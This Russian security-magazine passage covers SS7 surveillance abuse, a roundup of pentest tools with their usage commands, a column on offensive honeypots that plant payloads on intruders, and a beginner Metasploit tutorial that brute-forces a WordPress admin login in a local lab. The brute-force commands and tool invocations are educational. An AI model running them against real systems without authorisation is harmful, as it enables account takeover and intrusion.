тием провайдера VAS-услуг. Скорее всего, это не получится сделать в России,
однако есть страны с более лояльным законодательством в сфере телеком-
муникаций (или с сильной коррупцией). Кроме того, не следует забывать, что
в роли злоумышленника могут выступать и государственные спецслужбы —
для своей страны, естественно, на стороне добра.
   Второе но. Прежде чем пресечь зловредные действия, их надо заметить.
Крайне малое число операторов проводит постоянный мониторинг сетей SS7
на предмет вторжений и атак. И даже если атака через сеть SS7 будет замечена
и пресечена, никто не сможет сказать, когда она началась и как долго длилась.
   Третье но. Широкий резонанс и огласку в СМИ получили несколько случаев
злоупотреблений, связанных с SS7. Об одном из них сообщил Эдвард Сноуден,
затем информация была опубликована в Washington Post. Речь идет о сервисе
SkyLock, который позволяет вести слежку за мобильными абонентами, в том
числе через сети SS7.





   Как долго работал этот сервис? Сколько абонентов были «под колпаком»
за время его работы? Как долго этот сервис еще проработал бы, не будь со-
общения Сноудена? Вряд ли мы когда-нибудь получим ответы на эти вопросы.
  Еще один нашумевший случай — прослушка мобильных абонентов Украи-
ны с территории России. Да-да, такое тоже реально благодаря возможностям
SS7! С начала атак до их обнаружения и локализации прошло несколько меся-
цев. Атаки были пресечены административно-техническими методами, однако
за то время, пока утечки информации оставались незамеченными, был нане-
сен значительный урон оператору и государству.
Взлом





                                 Дмитрий «D1g1» Евдокимов,
                                                                Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                    ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!





                 GITHUB COMMIT CRAWLER
                         GitHub Commit Crawler — инструмент, написанный
                       на Python, для непрерывного мониторинга GitHub
                       на предмет ошибочных, уязвимых и подозритель-
                       ных public-коммитов в проекты.
                          Инструмент перечисляет членов определенного/
                       заданного репозитория, смотрит на их публичные
                      коммиты и парсит их на заданные ключевые слова,
                       совпадения по регулярным выражениям, которые
                         могут содержать важную информацию (например,
Автор:                   API-ключи, PGP private ключи, логины и пароли). За-
Chris Sandulow                         пуск идет через заданный промежуток времени (на-
                       пример, через каждые тридцать минут).
URL:                    Для простоты установки и использования тулза
github.com/jfalken/github_                       распространяется в виде docker-контейнера.
commit_crawler                           Устанавливается следующим образом:

                        # docker pull jfalken/github-commit-crawlerСистема:                        # docker run -d -p 5000:5000 jfalken/Windows/Mac                          github-commit-crawler
                      После этого можно подключиться через  http://
                           localhost:5000 или локальный IP.
                            Результат работы сохраняется в MongoDB и ото-
                       бражается через веб-интерфейс, где есть суперпо-
                        лезная кнопка Diff, которая отображает различие
                      коммитов и вхождение искомых ключевых слов.
                        Принцип работы как чрезвычайно прост, так
                      и эффективен. Очень часто по спешке или баналь-
                      ному незнанию в коммиты уходит критически важ-
                       ная информация. Порой она лежит в комментариях
                       или в виде вшитых аутентификационных данных вну-
                       тренней инфраструктуры, которую забыли удалить
                       после фазы тестирования.



                YASUO
                       Разработчики часто используют сторонние эле-
                        менты, не особо задумываясь об их безопасности
                      и о том, как они могут в конечном итоге повлиять
                       на безопасность всего проекта. Такое положение
                       дел часто приводит к удаленной компрометации
                       сервера через публичную уязвимость в хорошо из-
                       вестном сервисе. Это, к примеру, могут быть уязви-
                      мости в административной панели Apache Tomcat,
                       JBoss JMX console, Hudson Jenkins.
Автор:                    Если полазить по exploit-db и поискать там по-
0xsauby                     добные уязвимости, то можно найти более 10 ты-
                         сяч удаленно эксплуатируемых уязвимостей, приво-
URL:                  дящих к полной компрометации сервера, в сотнях
github.com/0xsauby/yasuo                       веб-приложений (фронтендах и бэкендах). Это RCE,
                       неаутентифицированная заливка файлов, SQLi или
Система:                  RFI/LFI и так далее.
Windows/Linux                          Yasuo — это Ruby-скрипт, который сканирует
                       веб-проекты на уязвимые сторонние расширения,
                        библиотеки, в общем, 3rd party элементы. Он быстро
                        сканирует сеть на наличие таких сторонних компо-
                        нентов и предоставляет возможность эксплуатации
                        в них уязвимостей.
                        Для установки потребуются следующие гемы:

                        # gem install ruby-nmap net-http-persistent
                          mechanize text-table
                    Примеры использования:

                        # ./yasuo -r 127.0.0.1 -p 80,8080,443,8443
                        -b form
                      Здесь будут произведены сканирование портов 80,
                        8080, 443 и 8443 на адресе 127.0.0.1 и брутфорс
                        всех приложений, предлагающих form-based аутен-
                       тификацию.

                        # ./yasuo -f my_nmap_output.xml -b all
                      Эта  команда  распарсит nmap-файл my_nmap_
                           output.xml и произведет брутфорс всех приложений,
                      предоставляющих form-based и HTTP basic методы
                        аутентификации.



                MIMOSA
                     Mimosa — это фреймворк на языке Python для зло-
                       употребления EPC-функциональностью на роуте-
                        рах CISCO. EPC расшифровывается как Embedded
                         packet capture. Данный механизм позволяет захва-
                         тывать как IPv-4, так и IPv6-пакеты, фильтр на опре-
                      деленные пакеты, просмотр содержимого пакетов
                       на лету, настраивать сетевые устройства на захват
                       трафика в определенных узлах сети, экспортиро-
                         вать нужную информацию в pcap-файлы.
Автор:                    Этот инструмент будет полезен в первую оче-
Rafael Silva                       редь специалистам, проводящим тесты на про-
                        никновение. Как ты, надеюсь, понял, инструмент
URL: github.com/rfdslabs/    не эксплуатирует никаких уязвимостей, а исполь-
Mimosa-Framework                          зует стандартный функционал, но в целях, нужных
                        пентестерам. В данном случае это будет полезно
Система:               для сбора информации в контролируемом окруже-
Windows/Linux                          нии, что может пригодиться для дальнейшей атаки
                      по сети. Но при этом нужно понимать, что для рабо-
                       ты с Mimosa необходимо иметь привилегии ENABLE
                       на роутере.
                          Инструмент был впервые представлен на конфе-
                      ренции Hack In The Box 2015 в Амстердаме. Для бо-
                       лее близкого знакомства с темой советуем изучить
                      презентацию  автора «µMIMOSAWRITERROUTER:
                         Abusing EPC on Cisco Routers to Collect Data».
                        Вызов справки:

                        $ python mimosa-cli.py
                        Mimosa> help
                      Доступные команды: _load, ed, li, pause, set,
                      start_capture, _relative_load, edit, list,
                      py,  shell,  stop_capture,  add_target,  hi,
                      list_targets, r, shortcuts, cmdenvironment,
                      history,  load,  run,  show,  del_target,  l,
                      mimosa_options, save, show_target.
                        Для получения справки по командам набери help
                      <имя_команды>.



                  SPYSTUDIO
                      Очень полезная вещь — смотреть, что делает при-
                      ложение во время своего выполнения, не только
                       на уровне сущностей, которыми оно оперирует (на-
                       пример, это можно увидеть благодаря набору ин-
                        струментов от SysInternals), но и на уровне функций
                      и параметров. Программа SpyStudio как раз в этом
                      и помогает.
                        Основные возможности:
                         •  трассировка приложения;
Автор:                   •  сравнение трейсов выполнения;
Nektra                         •  виртуализация приложения;
                         •  упрощение упаковки приложения для VMware
URL:                       ThinApp и Symantec Workspace Virtualization;
nektra.com/products/                         •  реализация утилиты procmon и возможность ра-
spystudio-api-monitor/                         боты с ее логом;
download/                         •  .NET Troubleshoot;
                         •  обнаружение вредоносного кода.
Система:
Windows                       Поддержка:
                         •  Windows XP и выше;
                         •  архитектур x86 и x64.

                     Данный проект лишь с недавнего времени обзавел-
                        ся бесплатной версией, раньше распространял-
                        ся бесплатно только сам движок Deviare. Инстру-
                       мент может быть полезен как IT-специалистам, так
                      и специалистам по поиску уязвимостей.



                   STATIC CODE ANALYSIS ДЛЯ SMALI
                 Мы ни для кого не откроем Америку, но для изуче-
                       ния приложения существует статический и динами-
                        ческий подход. Android-приложения не исключение.
                 И по-хорошему, прежде чем бросаться в динами-
                        ческий анализ, следовало бы предварительно изу-
                         чить его в статике. Да порой и просто нежелательно
                       или невозможно изучать приложение в динамике.
                         Smalisca как раз и создана для статического анали-
                        за smali-кода.
Автор:                    Особенности:
Victor Dorneanu                         •  парсинг: можно извлекать информацию о клас-
                               сах, свойствах класса, методах и вызовах между
URL:                       классами;
github.com/dorneanu/                         •  анализ: можно организовать умный поиск и на-
smalisca                           строить фильтры для поиска нужных классов
                         и методов, например:
Система:
Windows/Linux                smalisca> sc -c class_name -p test -r 10
                                     -x path -s class_type
                           smalisca> scl -fc com/android -fm init -r 10
                         •  визуализация: графическое отображение ин-
                       формации об отношении классов, методов и так
                            далее.

                     Все это позволяет очень быстро и эффективно ори-
                        ентироваться в чужом приложении при его анали-
                            зе. Определенно, инструмент категории must have
                       для анализа Android-приложений!



                 THE PENTESTERS FRAMEWORK
                       The PenTesters Framework (PTF) — это Python-скрипт
                       для основанных на Debian/Ubuntu дистрибутивов,
                       призванный унифицировать и упростить инструмен-
                       ты для теста на проникновение. Как правило, пенте-
                       стеры собирают все свои наработки и любимые ин-
                       струменты в директории /pentest/, где так или иначе
                       стараются следить за их актуальностью (обновле-
                         ниями).
                        PTF как раз и пытается установить все твои люби-
Автор:               мые пентест-программы самых последних версий,
Dave Kennedy                       скомпилировать их и сделать так, что ты сможешь
                       очень  просто  устанавливать/обновлять  дистри-
URL:                    бутив на любой машине. Все организовано таким
github.com/trustedsec/ptf                       образом, что это приближает тебя к исполнению
                           Penetration Testing Execution Standard (PTES) и по-
Система:               могает избежать множества неприятных вещей. Та-
Linux                      ким образом, твой пентест-дистрибутив содержит
                         только нужное и полезное тебе и ничего лишнего.
                 И развернуть то же самое на другой машине не со-
                         ставит труда. Это лишь фреймворк, так что в него
                       очень легко добавить свой любимый инструмент.



                  TRITON
                       Если такие слова, как  DBI, DBA,  Pin, concrete
                            execution, symbolic  execution, concolic  execution,
                      DSE, taint analysis, context snapshot, Z3, тебя не пу-
                          гают, а, наоборот, интересуют, то инструмент под
                      названием Triton как раз то, что тебе надо. Triton
                        предоставляет продвинутые возможности для улуч-
                     шения динамического бинарного анализа с исполь-
                      зованием PIN.
                        Основные возможности и особенности:
Автор:                   •  движок символьного выполнения;
Florent Saudel,                         •  представление кода для SMT;
Jonathan Salwan                         •  интерфейс для SMT-решателей;
                         •  движок taint-анализа;
URL:                    •  движок snapshot;
github.com/JonathanSalwan/                         •  API и Python bindings.
Triton
                       Проект позволяет прямо в динамике решать ряд
Система:               сложных задач и при необходимости перенаправ-
Linux                          лять поток исполнения программы на основании
                        данных, также полученных в динамике. Например,
                     можно увеличивать покрытие кода непосредствен-
                      но во время самого фаззинга.
                       На текущий момент проект поддерживает только
                            Linux и x64-архитектуру, но он активно развивается.
                        Для более близкого знакомства с возможно-
                       стями и внутренним устройством советуем изучить
                     следующие материалы: «Triton: Concolic Execution
                        Framework» и «Triton under the hood».
Malware


Колонка Дениса Макрушина
НАСТУПАТЕЛЬНАЯ
БЕЗОПАСНОСТЬ





                          Денис Макрушин
                             Выпускник факультета информационной безопасности НИЯУ
                         «МИФИ». Специализируется на исследовании угроз. Занимался
                              тестированием на проникновение и аудитом безопасности
                                корпоративных веб-приложений, стресс-тестированием
                            информационных систем на устойчивость к DDoS-атакам,
                          принимал участие в организации и проведении международных
                              мероприятий по проблемам практической безопасности
                                              @difezza, defec.ru@difezza, defec.ru


В 2013 году на конференции Black Hat Europe исследова-
тель и наш постоянный автор Алексей Синцов представил
публике исследование, в котором описал концепцию ак-
тивного ханипота и опробовал ее на практике. С тех пор
прошло уже два года, но в публичном доступе программ-
ных решений, основанных на концепции наступательной
безопасности, не появилось.





«Frontend» того самого ханипота, о котором рассказывал Алексей Синцов

С одной стороны, на рынке информационной безопасности явно выделяют-
ся тренды в направлении классической пассивной защиты: появляются но-
вые игроки со своими SIEM-системами, «импортозамещаются» классические
средства защиты, развиваются технологии борьбы с APT. С другой стороны,
в индустрии всплыли компании, которые не брезгуют продавать полноценную
малварь, предназначенную для комплексного мониторинга зараженной рабо-
чей станции. В результате подобные разработки находят своего потребителя
в лице правоохранительных органов.
   Однако в случае с «правительственной малварью» (о ней мы подробно пи-
сали в номере 180 нашего журнала) ее использование в каком бы то ни было
виде — прямое нарушение закона. А значит, этот подход противоречит кон-
цепции «наступательной безопасности».

НАПАДЕНИЕ — ЛУЧШАЯ ФОРМА ЗАЩИТЫ
«Лучшая защита — это нападение», — говорил Александр Македонский. Сло-
ва полководца подкрепляет тот факт, что защищающаяся сторона вынуждена
определить множество вариантов действий стороны атакующей. И как резуль-
тат, следом за сценарием атаки идет сценарий реакции на это событие, что от-
кидывает защищающуюся сторону на шаг назад. Это в классической модели
процесса конфликта.
   Применительно к ИБ превентивные меры борьбы с какой-либо угрозой за-
частую оказываются эффективнее, чем ответные. Однако архитектура любого
автоматизированного решения для борьбы с тем или иным видом угроз, осно-
ванная на контроле огромного количества точек присутствия, все-таки наме-
кает на то, что серебряная пуля может лететь в преступника, уже убегающего
из инфраструктуры с ценными данными. Именно по этой причине никто не по-
зиционирует решения класса antiAPT как «убийцу» услуг тестирования на про-
никновение и расследования инцидентов.
  APT — атаки, часто напоминающие работу хирургическим инструментом,
они используют одновременно несколько возможных вариантов проникнове-
ния и продвижения к цели. Злодей на каждом из этапов проводит тщательную
инвентаризацию и определенно учитывает наличие, тип и свойства защитных
решений. Другими словами, инциденты будут даже в инфраструктуре, нашпи-
гованной защитными программно-аппаратными продуктами различного типа.
Победитель противостояния ручной работы атакующего против автоматизи-
рованного средства защищающегося заранее определен.
   Тем не менее это ни в коем случае не отменяет необходимость использо-
вать средства защиты. Просто всегда в голове стоит держать самый пессими-
стичный сценарий развития событий: злодей проник в инфраструктуру и выта-
щил из нее ценную информацию.
   Индустрия уже довольно давно знает о достоинствах ханипотов. Именно
исследователи и государственные структуры, а не службы безопасности ка-
ких-либо коммерческих организаций могут оценить прелесть подобных ре-
шений, которые позволяют поймать какую-либо малварь или свежий эксплойт
к уязвимости для дальнейшего анализа.
   Почему бизнесу неинтересны решения подобного класса? Потому что «false
positive» может отправить клиента в ханипот, а бизнес уложить на лопатки. Так
что незачем испытывать судьбу. И тем не менее в ходе расследования ИБ-ин-
цидента этот бизнес вынужден инвестировать средства в оперативно-разыск-
ные мероприятия, чтобы найти «ответчика».
   Задачу расследования инцидентов можно упростить (если не решить во-
все) активным ханипотом, который описал Алексей Синцов. Точнее говоря, ав-
томатизированное средство защиты может помочь идентифицировать субъ-
екта инцидента, и зачастую еще до того, как этот инцидент случился и злодей
сбежал с ценными данными.
  Основные вопросы, которые может вызвать активный ханипот, атакующий
нарушителя:
•  Легально ли с юридической точки зрения атаковать хакера в ответ?
•  Как мне убедиться в том, что ханипот не атакует клиента?

ЮРИДИЧЕСКИЕ АСПЕКТЫ
Исследователь, предложивший концепцию системы «обратного тестирова-
ния на проникновение», оставил правовую сторону ее использования на откуп
юристам и прочим компетентным в этом вопросе людям. Попробуем вместе
оценить, насколько легально использование подобной системы.
   Рассмотрим сценарий, который описывал Алексей.
1. Атакующий успешно эксплуатирует уязвимость (или серию уязвимостей)
   в веб-приложении (SQL inj, XSS, bruteforce и так далее) и попадает в закры-
   тую зону веб-ресурса (админ-панель).
2. В админ-панели атакующий находит документы, которые предназначены
   для внутреннего пользования, и скачивает эти документы.
3. Документ содержит payload, который открывает канал утечки каких-либо
   данных об атакующем.

Последний пункт — тот самый камень преткновения между логикой и законом.
С одной стороны, злодей скомпрометировал целевую информационную си-
стему. Несет ли объект атаки ответственность за все последующие действия
злодея? Ответ: да, несет. Однако все зависит от payload’a. Если документ со-
держит эксплойт или каким-либо образом допускает исполнение произволь-
ного кода в операционной системе, то это нарушение закона. И такой инци-
дент законодательство каждой страны описывает по-своему.
   Например, это может нарушать «privacy laws» в США. Эти законы (Wiretap
Act, Electronic Communication Privacy Act) ограничивают вмешательство в част-
ную жизнь, даже если это происходит в процессе взлома offensive-ханипота.
С другой стороны, есть такое понятие, как «льгота для сервиса, находящего-
ся под защитой», которое позволяет собирать информацию о злоумышлен-
никах до тех пор и только в тех случаях, когда такая технология направлена
строго на защиту какого-либо объекта. Другими словами, существуют льготы
для оперативно-разыскных мероприятий.
  Кроме того, данный offensive-ханипот может не использовать сомнительные
инструменты вроде эксплойтов, а взять на вооружение легитимные особен-
ности прикладного программного обеспечения. Например, шаблон Word-до-
кумента может подгружаться с удаленного сервера и таким образом созда-
вать канал утечки информации о рабочей станции атакующего. Из всего этого
напрашивается вывод: ситуация, когда данные о злоумышленнике получены
при помощи offensive-ханипота, может неоднозначно интерпретироваться
с юридической точки зрения и зависит от методов и средств, которые исполь-
зуются для деанонимизации нарушителя.

АРХИТЕКТУРА OFFENSIVE HONEYPOT
Решение типа «offensive honeypot» должно выполнять следующие задачи:
1. Определять начальную стадию атаки.
2. Идентифицировать все последующие обращения атакующего к целевой си-
   стеме (то есть отделить его от потока легитимных обращений к целевой ИС).
3. Фиксировать каждое действие атакующего.
4. На каждом этапе атаки получать информацию об атакующем и его окруже-
   нии.

При этом — никаких false positive. Последний пункт — полет фантазии и твор-
чество для специалиста, проектирующего ханипот.
  В своем исследовании Алексей классифицировал возможных атакующих
следующим образом:
1. Автоматизированные средства (боты).
2. Скрипт-киддисы.
3. Black hat’ы.
4. White hat’ы.

Если цели каждой из этих ролей интуитивно не понятны, рекомендую обра-
титься к вайтпейперу исследования. Для каждой из этих ролей offensive-ха-
нипот должен реализовать свой сценарий нападения. В данном случае очень
хорошо применить теорию игр, но об этом поговорим в другой раз.
   Рассмотрим архитектуру решения на примере ханипота для веб-приложе-
ний. Впоследствии мы расширим эту концепцию до полноценной инфраструк-
туры.
   Итак, требования к архитектуре:
•  быстрая интеграция с целевой ИС;
•  прозрачность как для клиента, так и для атакующего.


Архитектура offensive honeypot
для веб-приложения





Фронтенд для целевой информационной системы решает следующие задачи:
1. Анализ запроса к бэкенду (задача web application firewall).
2. В случае если запрос легитимный, фронтенд перенаправляет его бэкенду.
3. Если запрос нелегитимный, фронтенд осуществляет фингерпринт брау-
   зера пользователя и перенаправляет его в ханипот (либо внедряет JS-код
   в оригинальные страницы).

О конкретных инструментах и их использовании мы поговорим в следующем
материале. Пока что можно сделать прогноз: в качестве средства frontend будет
использоваться веб-сервер nginx (возможно использование в связке с NAXSI
WAF). Более того, пейлоадам и сценариям, при которых они будут загружаться
на сторону атакующего, можно посвятить отдельный номер.

ЗАКЛЮЧЕНИЕ
«Наступательная безопасность» — понятие, которое с ростом количества ин-
цидентов в корпоративном и государственном секторе будет набирать обо-
роты и в будущем станет появляться в инфраструктуре в том или ином виде.
Еще позавчера понятие «кибервойска» было в словарном запасе футурологов
и фанатов жанра киберпанк. Возможно, уже завтра активные защитные реше-
ния, основанные на наступательном принципе, станут неотъемлемой частью
этих самых «кибервойск».


ВОПРОС ДЛЯ ДЕНИСА
Q: Что будет, если сидеть сейчас в интернете из-под Win 95/98? Буду ли я уяз-
вим для drive-by-атак и современной малвари?
   A: Возможно, автор этого вопроса считает, что пользователи устаревших
версий операционных систем неинтересны злоумышленникам и, как резуль-
тат, злодеи обходят таких «динозавров» стороной. Увы, это заблуждение.
  С одной стороны, владелец нового банковского трояна в меньшей степени
заинтересован в пользователях Win 98 по той причине, что, скорее всего та-
кой юзер не пользуется онлайн-банкингом (конечно, он генерит номера кред
и сидит на порносайтах через «веб-архив». — Прим. ред.). Но с другой — ма-
шинками с древними ОС (содержащими уязвимости нулевого дня) не брезгуют
владельцы ботнетов, использующие свои детища, например, для DDoS-атак.
А как мы уже знаем, для DDoS’а «все средства хороши».
  Но есть и третья сторона — практическая. Согласно статистике использу-
емых платформ (www.w3schools.com/browsers/browsers_os.asp), доля Win XP
на апрель 2015 года составляла 3,6% от общего числа ОС, и с каждым меся-
цем она падает. Соответственно, Win 9x практически полностью ушла в не-
бытие, а это значит, что разработчики малвари, нацеленной на кражу денеж-
ных средств из онлайн-банкинга, меньше всего заинтересованы в поддержке
этих ОС.
   Стоит помнить, что вирмейкеры — народ непривередливый, они старают-
ся максимально абстрагироваться от ОС и не завязывать функциональность
своих продуктов на конкретные версии. Для этого они используют типовые
API-функции, которые не меняются со временем и, таким образом, гаранти-
руют обратную совместимость со старыми версиями ОС. За примерами да-
леко ходить не нужно — разработчики малвари BlackEnergy2 написали ядро,
которое успешно отрабатывает как в Win 7, так и в Win 9x. Сторонние модули
к этой малвари уже могут иметь свои особенности, которые не позволят им
исполняться в «запылившейся» среде. И в этом случае задача определения
окружения ложится на дроппер, который любезно откроет двери в операцион-
ную систему, если она удовлетворят требованиям злодеев.
   Тем не менее не рекомендую испытывать судьбу и проверять все описанное
на своей рабочей станции, а по возможности устанавливать наиболее свежие
ОС и ПО.


ЗАДАЙ ВОПРОС ДЕНИСУ
Теперь ты можешь задать свой умный (или не очень) вопрос на тему безопас-
ности в целом и малвари в частности, а Денис — публично на него ответит.
Спамим сюда: condifesa@gmail.com.
Malware




ПОГРУЖЕНИЕ

                      ЧАСТЬ I   В METASPLOIT

                        ЗНАКОМИМСЯ
                        С МОЩНЫМ
                       ФРЕЙМВОРКОМ
                Михаил Овчинников            ДЛЯ АНАЛИЗА
                       michail@ovchinnikov.cc            БЕЗОПАСНОСТИ




Metasploit — это мощный открытый фреймворк с про-
думанной архитектурой, сотнями контрибьюторов,
который включает в себя тысячи модулей для авто-
матизации эксплуатации огромного количества уяз-
вимостей. Несмотря на то что Metasploit регулярно
появляется в ][, многие только знакомятся с ним. Мы
решили помочь начинающим пентестерам и запу-
скаем новый цикл статей, который познакомит тебя с
основными возможностями этого замечательного ин-
струмента.

ПРЕДЫСТОРИЯ
История Metasploit берет начало в 2003 году. HD Moore,
работавший пентестером в небольшой консалтинго-
вой компании, заметил, что хранение и использование
средств анализа безопасности организованы неудобно.
На тот момент это был просто набор разрозненных экс-
плойтов и скриптов, общие сведения о которых хранились                                               WARNING
в базе данных. Информация о необходимом окружении
для запуска скриптов, как правило, отсутствовала. Также    Вся информация предо-
                                                                             ставлена исключитель-они несли в себе кучу устаревшего кода, требовали мо-                                                                        но в ознакомительных
дификации жестко прописанных путей для каждого кон-       целях. Ни редакция,
кретного случая, что весьма затрудняло рабочий процесс     ни автор не несут ответ-
                                                                             ственности за любойи усложняло разработку новых инструментов.
                                                                    возможный вред, при-
  В Metasploit автор, пытаясь решить эту проблему, со-                                                                       чиненный материалами
здал консольную утилиту на Perl с псевдографическим        данной статьи.
интерфейсом и включил в нее порядка одиннадцати экс-
плойтов. Сообщество встретило первую версию Metasploit весьма холодно, из-
рядно раскритиковав как архитектуру, так и саму идею. Тем не менее HD Moore
не сдался и даже нашел сподвижника в лице spoonm, с которым они довели
до ума модульную архитектуру фреймворка и выпустили вторую версию в 2004
году. Со временем фреймворк стал набирать популярность и обретать новых
контрибьюторов.
  Следующим значимым шагом был перевод Metasploit c Perl на Ruby, для того
чтобы избежать ограничений Perl, обеспечить кросс-платформенность и до-
биться большей гибкости при разработке. В 2009 году фреймворк приобре-
ла компания Rapid7, под эгидой которой продолжилось развитие open source
версии, а также стали появляться коммерческие версии продукта. Сам фрейм-
ворк давно перерос статус простого набора для пентестера, и сегодня можно
его можно встретить (хотя и нечасто) даже в арсенале «мирных» системных ад-
министраторов и программистов.

ВЕРСИИ
На момент написания статьи Metasploit распространяется в четырех версиях:
•  Framework — базовая версия с консольным интерфейсом;
•  Community — бесплатная версия, включающая дополнительно веб-интер-
  фейс и часть функционала из коммерческих версий;
•  Express — для коммерческих пользователей, включает функционал, позво-
  ляющий упростить проведение базовых аудитов и формирование отчетно-
   сти по ним;
•  Pro — самая продвинутая версия, предоставляет расширенные возможно-
   сти для проведения атак, позволяет формировать цепочки задач для ауди-
    та, составлять подробную отчетность и многое другое.

Помимо веб-интерфейса, доступного в версиях Community, Express и Pro,
существуют такие проекты, как Armitage и Cobalt strike, предоставляющие
GUI-интерфейс для фреймворка.

УСТАНОВКА
На текущий момент поддерживаются все актуальные версии Windows и боль-
шинство популярных дистрибутивов Linux. В обоих случаях разработчики пре-
доставляют графический инсталлятор, так что проблем с установкой возник-
нуть не должно. Специализированные дистрибутивы для пентеста, такие как
Kali Linux, Pentoo, Black Arch и некоторые другие, уже включают Metasploit в свой
состав.
   Стоит отметить, что перед установкой необходимо выключить антивирусы
и другие средства защиты, так как большинство из них распознают Metasploit
как вредоносную программу.

База данных
Еще один момент, который стоит учесть, — это использование фреймворком
базы данных для хранения информации о хостах, сервисах, уязвимостях и про-
чем. Подключение к базе — *необязательное условие* для функционирования
фреймворка, но тем не менее многие предпочтут воспользоваться этим функ-
ционалом для удобства и повышения производительности.
   Metasploit использует PostgreSQL, поэтому тебе понадобится установить ее
на свою систему. Затем убедиться, что запущены нужные сервисы БД и фрейм-
ворка. Запустить их можно соответствующими командами (команды приводят-
ся для Kali Linux, могут отличаться в твоем дистрибутиве):

service postgresql start
service metasploit start

Далее проверим, что фреймворк успешно установил подключение. Откроем
консоль Metasploit командой msfconsole, а затем выполним db_status, в от-
вет на которую система должна вернуть, что соединение с базой установлено.

СТРУКТУРА ФРЕЙМВОРКА
«Сердце» Metasploit — библиотека Rex. Она требуется для операций общего
назначения: работы с сокетами, протоколами, форматирования текста, работы
с кодировками и подобных. На ней базируется библиотека MSF Core, которая
предоставляет базовый функционал и «низкоуровневый» API. Его использует
библиотека MSF Base, которая, в свою очередь, предоставляет API для плаги-
нов, интерфейса пользователя (как консольного, так и графического), а также
модулей.
  На модулях стоит остановиться подробнее. Они делятся на несколько ти-
пов, в зависимости от предоставляемой функциональности:
•  Exploit — код, эксплуатирующий определенную уязвимость на целевой си-
   стеме (например, переполнение буфера);
•  Payload — код, который запускается на целевой системе после того, как
   отработал эксплойт (устанавливает соединение, выполняет шелл-скрипт
   и прочее);
•  Post — код, который запускается на системе после успешного проникнове-
   ния (например, собирает пароли, скачивает файлы);
•  Encoder — инструменты для обфускации модулей с целью маскировки от ан-
   тивирусов;
• NOP — генераторы NOP’ов. Это ассемблерная инструкция, которая не про-
   изводит никаких действий. Используется, чтобы заполнять пустоту в испол-
   няемых файлах, для подгонки под необходимый размер;
•  Auxiliary — модули для сканирования сети, анализа трафика и так далее.





Структура фреймворка

КОМАНДЫ MSFCONSOLE
Несмотря на наличие графических интерфейсов, самым распространенным
способом работы с Metasploit по-прежнему остается консольный интерфейс
msfconsole. Рассмотрим основные команды:
•  use — выбрать определенный модуль для работы с ним;
•  back — операция, обратная use: перестать работать с выбранным модулем
   и вернуться назад;
•  show — вывести список модулей определенного типа;
•  set— установить значение определенному объекту;
•  run — запустить вспомогательный модуль после того, как были установлены
   необходимые опции;
•  info — вывести информацию о модуле;
•  search — найти определенный модуль;
•  check — проверить, подвержена ли целевая система уязвимости;
•  sessions — вывести список доступных сессий.

ПЕНТЕСТ WORDPRESS
Предлагаю, вооружившись полученными знаниями, в качестве «Hello world»
провести простейший пентест сайта на WordPress.

Тестовое окружение
Для начала необходимо поднять тестовое окружение. Для этого я буду поль-
зоваться связкой VirtualBox + Vagrant и проектом VCCW, который позволит
развернуть готовую виртуалку с WordPress на борту буквально парой команд
в консоли. Подробные инструкции ты сможешь найти на сайте проекта, здесь я
покажу основные шаги.
   Добавляем базовый образ:

vagrant box add miya0001/vccw

Затем скачиваем с сайта проекта архив с Vagrantfile, кукбуками Chef и прочим,
распаковываем, переходим в папку, где лежит Vagrantfile, и выполняем команду

vagrant up

После этого у тебя должна подняться машина с развернутым WordPress, до-
ступная по адресу 192.168.33.10. Стоит отметить, что это уже готовый сетап,
где настроена база и заведена админская учетка. Логин и пароль от нее указа-
ны на сайте, но мы их узнаем другим путем:) .

Пентест
Откроем консоль Metasploit:

 msfconsole

Запустим поиск по слову wordpress, чтобы найти необходимый модуль:

search wordpress

Среди появившегося многообразия нас интересует модуль auxiliary/
scanner/http/wordpress_login_enum, который отвечает за брутфорс аутен-
тификации WordPress.





Результаты поиска модулей по запросу wordpress


Выберем его для работы:

use auxiliary/scanner/http/wordpress_login_enum

Чтобы понять, как его использовать, можно ввести команду info, которая вы-
ведет краткое описание модуля и список используемых параметров.
Прежде всего, укажем адрес хоста, на котором расположен сайт:

set RHOSTS 192.168.33.10

Для брутфорса будет использоваться перебор по словарю. В данном случае
известно, что пароль несложный, поэтому подойдет практически любой список
ненадежных паролей, которых достаточно в сети. Укажем путь к нему:

set PASS_FILE /root/10k-common-passwords.txt

По умолчанию модуль продолжит перебирать пароли, даже встретив нужный.
Это полезно, когда на сайте больше одной учетной записи. В нашем случае
нужно просто остановиться, когда пароль будет найден. Для этого тоже имеет-
ся соответствующая опция:

set STOP_ON_SUCCESS true

Также можно запретить вывод в консоль всех малозначимых сообщений, вроде
неудачных попыток авторизации:

set VERBOSE false

Теперь, когда подготовительные действия совершены, осталось ввести по-
следнюю короткую команду и ждать результата:

run

После окончания процесса мы увидим в выводе командной строки, что на сай-
те был найден пользователь с именем admin и пароль, который к нему подо-
шел, был тоже admin.





Процесс перебора пароля по словарю в Metasploit





Результат работы модуля


ИТОГ
Хотя мы не рассмотрели и сотой доли возможностей
Metasploit, сегодняшний материал должен стать хорошей
отправной точкой в освоении этого инструмента. В конце    WWW
хотелось бы традиционно напомнить, что любой инстру-                                                                    Официальный сайт
мент можно использовать как во благо, так и во вред. В не-                                                                                           Metasploit
умелых руках отдельные компоненты этого фреймворка
могут нанести серьезный ущерб.                                  Страница загрузок
                                                                                           Metasploit
   Поэтому, во‑первых, используй его, только имея соот-
ветствующее разрешение на исследование безопасно-   Один из лучших гайдов
сти от владельца системы. В противном случае ты риску-        по Metasploit
                                                                                  от Offensive securityешь получить серьезные проблемы с законом. Во-вторых,
даже имея соответствующее разрешение, не применяй
его на продакшен-системах и в сети заказчика, а создай виртуальное, локаль-
ное окружение с необходимым софтом (подобно тому, как я показал в статье).
Помимо безопасности такого подхода, в качестве бонуса ты получаешь воз-
можность легко откатиться, версионировать, клонировать и совершать другие
полезные действия, которые помогут упростить исследование.
Кодинг





 Интервью
 с создателем
 GUI для AV
   Андрей Федонюк про skillsets,
   separation of conсerns и митболы


                                                                                             deeonis
                                                                                                 deeonis@gmail.com




   Решили мы в этот раз попробовать новый формат интервью — «програм-
мистам от программистов». Мы побеседуем с автором широко известной в уз-
ких антивирусных кругах UI-библиотеки, но разговаривать будем не про жизнь
